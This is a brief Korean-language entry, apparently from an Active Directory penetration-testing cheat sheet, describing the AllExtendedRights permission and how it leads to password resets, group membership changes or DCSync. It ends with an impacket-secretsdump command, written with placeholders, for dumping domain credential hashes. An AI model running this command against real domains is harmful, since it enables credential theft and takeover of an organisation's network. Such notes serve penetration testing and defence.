# AllExtendedRights

ForceChangePassword와 AddMember를 포함하는 확장 권한 집합이다. 도메인 오브젝트에 있으면 DCSync 권한도 포함된다.

유저 대상 → **ForceChangePassword 섹션** 동일

그룹 대상 → **GenericAll — 그룹 대상 / AddMember 섹션** 동일

도메인 대상 → DCSync 바로 실행 가능

```bash
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<DC_IP>
```